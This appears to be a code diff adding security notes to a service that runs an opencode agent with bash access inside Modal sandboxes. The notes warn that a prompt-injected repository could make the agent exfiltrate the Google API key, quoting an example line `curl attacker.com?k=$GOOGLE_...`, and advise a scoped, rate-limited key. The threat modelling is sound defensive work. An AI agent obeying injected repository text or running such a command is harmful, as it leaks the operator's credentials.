@@ -9,6 +9,17 @@ Secrets: GOOGLE_API_KEY lives in the `looptap-secrets` Modal secret (populated
 by scripts/setup.sh). We mirror it into GOOGLE_GENERATIVE_AI_API_KEY (what
 opencode's google provider reads) for sandbox runs.
 
+Security — use a scoped provider key:
+    /analyze-repo shells out to opencode with `bash: allow` in the hosted
+    config (opencode.hosted.json). The Modal sandbox is disposable, but the
+    provider credential is *in its env* and a prompt-injected repo could
+    coerce the agent into exfiltrating it (`curl attacker.com?k=$GOOGLE_...`).
+    Mitigation: put a rate-limited, short-lived, single-purpose Google API
+    key in `looptap-secrets` — NOT your primary key. Rotate it on a schedule.
+    If your provider supports per-project or per-route scoping (Google AI
+    Studio does), use that. The blast radius of the key *is* the blast radius
+    of this endpoint.
+
 Repo convention inside `looptap-repos`: one git clone per path `<owner>/<name>`.
 POST /index-repo seeds it from a public GitHub URL; GET /repos lists what's
 there; POST /analyze-repo spawns an opencode sandbox against a branch.
@@ -149,6 +160,12 @@ def _sandbox_run(script: str, timeout: int) -> tuple[int, str, str]:
             modal.Secret.from_name(SECRET_NAME),
             # looptap-secrets carries GOOGLE_API_KEY; opencode's google provider
             # wants GOOGLE_GENERATIVE_AI_API_KEY. Mirror it in.
+            #
+            # This key is visible to any bash the agent decides to run
+            # (opencode.hosted.json grants `bash: allow` so git, ripgrep, etc.
+            # work). Use a scoped/rate-limited key in looptap-secrets — not
+            # your primary — so a prompt-injection-driven exfil caps out at a
+            # key you were willing to lose.
             modal.Secret.from_dict({"GOOGLE_GENERATIVE_AI_API_KEY": key}),
         ],
         app=app,
